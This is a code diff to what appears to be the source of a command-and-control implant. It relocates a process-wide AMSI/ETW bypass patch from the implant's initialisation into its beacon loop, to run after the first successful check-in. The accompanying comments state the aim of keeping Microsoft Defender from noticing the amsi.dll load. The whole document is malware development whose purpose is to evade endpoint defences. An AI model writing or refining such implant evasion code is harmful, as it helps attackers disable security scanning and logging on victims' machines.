@@ -84,6 +84,11 @@ VOID DemonMain( PVOID ModuleInst, PKAYN_ARGS KArgs )
 _Noreturn
 VOID DemonRoutine()
 {
+    /* ARC-01: AMSI/ETW bypass is deferred to post-TransportInit so Defender does
+     * not intercept amsi.dll load from a process with zero network connections.
+     * Applied once after the first successful checkin. */
+    BOOL AmsiPatched = FALSE;
+
     /* the main loop */
     for ( ;; )
     {
@@ -98,6 +103,16 @@ VOID DemonRoutine()
                 /* reset the failure counter since we managed to connect to it. */
                 Instance->Config.Transport.Host->Failures = 0;
 #endif
+
+                /* Apply process-wide AMSI/ETW patch once, after the first successful
+                 * connection — deferred from DemonInit to avoid triggering Defender
+                 * on amsi.dll load before any network activity. */
+                if ( ! AmsiPatched && Instance->Config.Implant.AmsiEtwPatch == AMSIETW_PATCH_MEMORY ) {
+                    if ( ! NT_SUCCESS( AmsiEtwBypassPatch() ) ) {
+                        PUTS( "[BYPASS] Warning: process-wide AMSI/ETW patch failed" )
+                    }
+                    AmsiPatched = TRUE;
+                }
             }
         }
 
@@ -563,15 +578,6 @@ VOID DemonInit( PVOID ModuleInst, PKAYN_ARGS KArgs )
         if ( ! ( ( BOOL (*)() ) RtModules[ i ] ) () ) {
             PUTS( "Failed to load a module" )
             return;
-        }
-    }
-
-    /* ARC-01: apply persistent process-wide AMSI/ETW bypass when configured.
-     * In-memory patching covers every thread — present and future — without
-     * any per-thread hardware breakpoint registration. */
-    if ( Instance->Config.Implant.AmsiEtwPatch == AMSIETW_PATCH_MEMORY ) {
-        if ( ! NT_SUCCESS( AmsiEtwBypassPatch() ) ) {
-            PUTS( "[BYPASS] Warning: process-wide AMSI/ETW patch failed" )
         }
     }
 
